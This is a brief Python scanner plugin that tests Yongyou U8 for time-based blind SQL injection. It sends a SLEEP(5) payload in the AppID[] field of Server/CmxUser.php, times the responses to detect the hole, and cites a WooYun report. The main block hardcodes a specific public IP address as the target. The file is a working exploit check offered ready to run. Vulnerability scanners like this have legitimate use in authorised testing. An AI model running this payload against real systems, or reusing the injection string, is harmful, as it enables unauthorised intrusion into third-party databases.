#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0157215

import re
import time

def assign(service, arg):
    if service == "yongyou_u8":
        return True, arg    

def audit(arg):
    url = arg + "Server/CmxUser.php?pgid=AddUser_Step4"
    data_poc = "UserName=test&AppID[]=0%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))PyGh)"
    data = "UserName=test&AppID[]=0"
    time1 = time.time()
    code, head, res, errcode, _ = curl.curl2(url, data)
    time2 = time.time()
    code, head, res, errcode, _ = curl.curl2(url, data_poc)
    time3 = time.time()
    code, head, res, errcode, _ = curl.curl2(url, data)
    time4 = time.time()
    if abs((time2 - time1) - (time4 - time3)) < 2 and abs((time3 - time2) - (time2 - time1)) > 4:
        security_hole(url + '   sql injection!')
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_u8', 'http://221.224.116.210:81/')[1])